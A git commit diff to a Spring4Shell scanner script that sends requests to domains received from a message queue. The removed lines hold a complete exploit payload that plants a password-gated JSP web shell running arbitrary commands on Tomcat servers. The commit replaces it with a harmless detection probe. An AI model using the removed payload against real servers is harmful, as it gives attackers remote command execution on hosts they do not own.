bed0d1d21f871e8a5ec2bb2eec390dace8ebd339
lcampbell2 <l.campbell144768@gmail.com>
2022-04-01 17:01:04 -0300

    update request body and headers

--- scanners/spring4shell/index.js
+++ scanners/spring4shell/index.js
@@ -6,15 +6,10 @@ config()
 const { SUBSCRIBE_TO: topic, NATS_URL } = process.env
 
 const headers = {
-  suffix: '%>//',
-  c1: 'Runtime',
-  c2: '<%',
   DNT: '1',
   'Content-Type': 'application/x-www-form-urlencoded',
 }
-const body =
-  'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='
-
+const body = 'class.module.classLoader.DefaultAssertionStatus=nonsense'
 process.on('SIGTERM', () => process.exit(0))
 process.on('SIGINT', () => process.exit(0))
 ;(async () => {
@@ -28,12 +23,18 @@ process.on('SIGINT', () => process.exit(0))
   for await (const m of sub) {
     const { domain } = jc.decode(m.data)
     try {
-      const res = await fetch(`https://${domain}`, {
+      const res1 = await fetch(`https://${domain}`)
+      console.log(JSON.stringify({ domain: domain, httpStatus: res1.status }))
+    } catch (error) {
+      console.error(error)
+    }
+    try {
+      const res2 = await fetch(`https://${domain}`, {
         method: 'POST',
         body,
         headers,
       })
-      const data = await res.text()
+      const data = await res2.text()
       console.log({ data })
     } catch (err) {
       console.error(err)
